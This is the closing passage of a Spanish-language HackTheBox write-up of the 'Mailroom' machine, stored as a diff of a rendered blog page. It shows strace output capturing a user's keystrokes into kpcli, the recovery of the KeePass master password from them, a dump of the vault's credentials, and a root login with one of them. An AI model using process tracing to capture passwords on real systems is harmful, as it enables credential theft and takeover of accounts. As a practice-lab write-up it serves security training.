+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"a"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"t"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"t"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"h"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"e"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"w"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"/"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"p"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"e"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"r"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"s"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"o"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"n"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"a"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"l"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"."</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"k"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"d"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"b"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"x"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>5, <span class="s2">"</span><span class="se">\3\3</span><span class="s2">31</span><span class="se">\2</span><span class="s2">42</span><span class="se">\2</span><span class="s2">32g</span><span class="se">\3</span><span class="s2">73K</span><span class="se">\2</span><span class="s2">65</span><span class="se">\1\0\3\0\2\2</span><span class="s2">0</span><span class="se">\0</span><span class="s2">001</span><span class="se">\3</span><span class="s2">01</span><span class="se">\3</span><span class="s2">62</span><span class="se">\3</span><span class="s2">46</span><span class="se">\2</span><span class="s2">77qCP</span><span class="se">\2</span><span class="s2">76X</span><span class="se">\5</span><span class="s2">!j</span><span class="se">\3</span><span class="s2">74Z</span><span class="se">\3</span><span class="s2">77</span><span class="se">\3</span><span class="s2">"</span>..., 8192<span class="o">)</span> <span class="o">=</span> 1998
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"!"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"s"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"E"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"c"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"U"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"r"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"3"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"p"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"4"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"$"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"$"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"w"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"0"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"1"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"</span><span class="se">\1</span><span class="s2">0"</span>, 8192<span class="o">)</span>                    <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"r"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"d"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"9"</span>, 8192<span class="o">)</span>                      <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, 0x55d5d70df5d0, 8192<span class="o">)</span>           <span class="o">=</span> <span class="nt">-1</span> EAGAIN <span class="o">(</span>Resource temporarily unavailable<span class="o">)</span>
+<span class="nb">read</span><span class="o">(</span>0, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 8192<span class="o">)</span>                     <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>5, <span class="s2">"</span><span class="se">\3\3</span><span class="s2">31</span><span class="se">\2</span><span class="s2">42</span><span class="se">\2</span><span class="s2">32g</span><span class="se">\3</span><span class="s2">73K</span><span class="se">\2</span><span class="s2">65</span><span class="se">\1\0\3\0\2\2</span><span class="s2">0</span><span class="se">\0</span><span class="s2">001</span><span class="se">\3</span><span class="s2">01</span><span class="se">\3</span><span class="s2">62</span><span class="se">\3</span><span class="s2">46</span><span class="se">\2</span><span class="s2">77qCP</span><span class="se">\2</span><span class="s2">76X</span><span class="se">\5</span><span class="s2">!j</span><span class="se">\3</span><span class="s2">74Z</span><span class="se">\3</span><span class="s2">77</span><span class="se">\3</span><span class="s2">"</span>..., 8192<span class="o">)</span> <span class="o">=</span> 1998
+<span class="nb">read</span><span class="o">(</span>5, <span class="s2">"</span><span class="se">\n</span><span class="s2">package Compress::Raw::Zlib;</span><span class="se">\n\n</span><span class="s2">r"</span>..., 8192<span class="o">)</span> <span class="o">=</span> 8192
+<span class="nb">read</span><span class="o">(</span>5, <span class="s2">" if </span><span class="nv">$validate</span><span class="s2"> &amp;&amp; </span><span class="nv">$value</span><span class="s2"> !~ /^</span><span class="se">\\</span><span class="s2">d+"</span>..., 8192<span class="o">)</span> <span class="o">=</span> 8192
+<span class="nb">read</span><span class="o">(</span>5, <span class="s2">"    croak </span><span class="se">\"</span><span class="s2">Compress::Raw::Zlib::"</span>..., 8192<span class="o">)</span> <span class="o">=</span> 8192
+<span class="nb">read</span><span class="o">(</span>5, <span class="s2">"</span><span class="se">\1</span><span class="s2">77ELF</span><span class="se">\2\1\1\0\0\0\0\0\0\0\0\0\3\0</span><span class="s2">&gt;</span><span class="se">\0\1\0\0\0\0</span><span class="s2">)</span><span class="se">\0\0\0\0\0\0</span><span class="s2">"</span>..., 832<span class="o">)</span> <span class="o">=</span> 832
+<span class="nb">read</span><span class="o">(</span>5, <span class="s2">"</span><span class="se">\1</span><span class="s2">77ELF</span><span class="se">\2\1\1\3\0\0\0\0\0\0\0\0\3\0</span><span class="s2">&gt;</span><span class="se">\0\1\0\0\0\2</span><span class="s2">00</span><span class="se">\"\0\0\0\0\0\0</span><span class="s2">"</span>..., 832<span class="o">)</span> <span class="o">=</span> 832
+<span class="nb">read</span><span class="o">(</span>5, <span class="s2">"# XML::Parser</span><span class="se">\n</span><span class="s2">#</span><span class="se">\n</span><span class="s2"># Copyright (c) "</span>..., 8192<span class="o">)</span> <span class="o">=</span> 8192
+<span class="nb">read</span><span class="o">(</span>6, <span class="s2">"package XML::Parser::Expat;</span><span class="se">\n\n</span><span class="s2">use"</span>..., 8192<span class="o">)</span> <span class="o">=</span> 8192
+<span class="nb">read</span><span class="o">(</span>6, <span class="s2">";</span><span class="se">\n</span><span class="s2">    }</span><span class="se">\n</span><span class="s2">}</span><span class="se">\n\n</span><span class="s2">sub position_in_conte"</span>..., 8192<span class="o">)</span> <span class="o">=</span> 8192
+<span class="nb">read</span><span class="o">(</span>6, <span class="s2">"</span><span class="se">\1</span><span class="s2">77ELF</span><span class="se">\2\1\1\0\0\0\0\0\0\0\0\0\3\0</span><span class="s2">&gt;</span><span class="se">\0\1\0\0\0\2</span><span class="s2">40&lt;</span><span class="se">\0\0\0\0\0\0</span><span class="s2">"</span>..., 832<span class="o">)</span> <span class="o">=</span> 832
+<span class="nb">read</span><span class="o">(</span>6, <span class="s2">"</span><span class="se">\1</span><span class="s2">77ELF</span><span class="se">\2\1\1\0\0\0\0\0\0\0\0\0\3\0</span><span class="s2">&gt;</span><span class="se">\0\1\0\0\0</span><span class="s2">000B</span><span class="se">\0\0\0\0\0\0</span><span class="s2">"</span>..., 832<span class="o">)</span> <span class="o">=</span> 832
+<span class="nb">read</span><span class="o">(</span>5, <span class="s2">"package MIME::Base64;</span><span class="se">\n\n</span><span class="s2">use stric"</span>..., 8192<span class="o">)</span> <span class="o">=</span> 5450
+<span class="nb">read</span><span class="o">(</span>5, <span class="s2">"</span><span class="se">\1</span><span class="s2">77ELF</span><span class="se">\2\1\1\0\0\0\0\0\0\0\0\0\3\0</span><span class="s2">&gt;</span><span class="se">\0\1\0\0\0\3</span><span class="s2">00</span><span class="se">\2</span><span class="s2">2</span><span class="se">\0\0\0\0\0\0</span><span class="s2">"</span>..., 832<span class="o">)</span> <span class="o">=</span> 832
+<span class="nb">read</span><span class="o">(</span>6, <span class="s2">"</span><span class="se">\3\3</span><span class="s2">31</span><span class="se">\2</span><span class="s2">42</span><span class="se">\2</span><span class="s2">32g</span><span class="se">\3</span><span class="s2">73K</span><span class="se">\2</span><span class="s2">65</span><span class="se">\1\0\3\0\2\2</span><span class="s2">0</span><span class="se">\0</span><span class="s2">001</span><span class="se">\3</span><span class="s2">01</span><span class="se">\3</span><span class="s2">62</span><span class="se">\3</span><span class="s2">46</span><span class="se">\2</span><span class="s2">77qCP</span><span class="se">\2</span><span class="s2">76X</span><span class="se">\5</span><span class="s2">!j</span><span class="se">\3</span><span class="s2">74Z</span><span class="se">\3</span><span class="s2">77</span><span class="se">\3</span><span class="s2">"</span>..., 8192<span class="o">)</span> <span class="o">=</span> 1998
+<span class="nb">read</span><span class="o">(</span>6, <span class="s2">""</span>, 8192<span class="o">)</span>                       <span class="o">=</span> 0
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"l"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"s"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">" "</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"R"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"o"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"o"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"t"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"/"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"s"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"h"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"o"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"w"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">" "</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"-"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"f"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">" "</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"0"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"q"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"u"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"i"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"t"</span>, 1<span class="o">)</span>                         <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>3, <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>, 1<span class="o">)</span>                        <span class="o">=</span> 1
+<span class="nb">read</span><span class="o">(</span>7, <span class="s2">"# NOTE: Derived from blib/lib/Te"</span>..., 8192<span class="o">)</span> <span class="o">=</span> 665
+<span class="nb">read</span><span class="o">(</span>7, <span class="s2">""</span>, 8192<span class="o">)</span>                       <span class="o">=</span> 0
++++ exited with 0 +++</code></pre></figure>
+
+<p>Obtenemos <code class="language-plaintext highlighter-rouge">!sEcUr3p4$$w01\rd9</code>.</p>
+
+<p>Usamos kpcli y abrimos personal.kdbx, pero no es valida.</p>
+
+<p>El \r me hace pensar que ahy termina la password (retorno de carro), pero no funciona de todas formas</p>
+
+<p>Me queda claro que hay que modificar la contraseña, despues de volver a leer la salida de strace me fijo que en realidad no es “01" sino “\10”  <code class="language-plaintext highlighter-rouge">read(0, "\10", 8192)</code> aun no funciona <code class="language-plaintext highlighter-rouge">!sEcUr3p4$$w\01rd9</code>.</p>
+
+<p>Siguendo lo que hace “\r” en lenguajes de programacion es solamente un termino de linea(retorno de carro), lo elimino y queda <code class="language-plaintext highlighter-rouge">!sEcUr3p4$$w01d9</code> que tampoco funciona, eliminado solo “" queda <code class="language-plaintext highlighter-rouge">!sEcUr3p4$$w01rd9</code> se ve mejor pero aun no es valida, siguiendo la similitud que tiene con la palabra “password” quedaria asi <code class="language-plaintext highlighter-rouge">!sEcUr3p4$$w0rd9</code> y alfin es valida.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">kpcli:/&gt; open personal.kdbx
+Please provide the master password: <span class="k">*************************</span>
+kpcli:/&gt; <span class="nb">ls</span>
+<span class="o">===</span> Groups <span class="o">===</span>
+Root/
+kpcli:/&gt; <span class="nb">ls </span>Root/
+<span class="o">===</span> Entries <span class="o">===</span>
+0. food account                                            door.dash.local
+1. GItea Admin account                                    git.mailroom.htb
+2. gitea database password
+3. My Gitea Account                                       git.mailroom.htb
+4. root acc
+kpcli:/&gt; show <span class="nt">-f</span> 0
+
+Title: food account
+Uname: matthew_doordash
+ Pass: fake_password
+  URL: http://door.dash.local/
+Notes: yum yum food yum
+
+kpcli:/&gt; show <span class="nt">-f</span> 1
+
+Title: GItea Admin account
+Uname: administrator
+ Pass: CZTwvKT7yHyEdb4
+  URL: http://git.mailroom.htb/
+Notes: For fixing stuff only!
+
+kpcli:/&gt; show <span class="nt">-f</span> 2
+
+Title: gitea database password
+Uname: gitea
+ Pass: gitea_l33t_p@ssw04d
+  URL:
+Notes:
+
+kpcli:/&gt; show <span class="nt">-f</span> 3
+
+Title: My Gitea Account
+Uname: matthew
+ Pass: HueLover83#
+  URL: http://git.mailroom.htb/
+Notes: <span class="k">for </span>work
+
+kpcli:/&gt; show <span class="nt">-f</span> 4
+
+Title: root acc
+Uname: root
+ Pass: a<span class="nv">$gBa3</span><span class="o">!</span>GA8
+  URL:
+Notes: root account <span class="k">for </span>sysadmin <span class="nb">jobs</span></code></pre></figure>
+
+<p>La ultima credencial <code class="language-plaintext highlighter-rouge">a$gBa3!GA8</code> es valida para el usuario root.</p>
+
+<figure class="highlight"><pre><code class="language-sh" data-lang="sh">matthew@mailroom:~<span class="nv">$ </span>su <span class="nt">--login</span> root
+Password: a<span class="nv">$gBa3</span><span class="o">!</span>GA8
+root@mailroom:~# <span class="nb">cat</span> /root/root.txt
+933d91203803f0e3e4e3d69757a5d621</code></pre></figure>
+
+
+  </div><a class="u-url" href="/hackthebox/machines/hard/2023/08/18/Mailroom.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">l1nvx</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Publicare articulos sobre HackTheBox, TryHackme y algunas cosas que me llaman la atencion.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
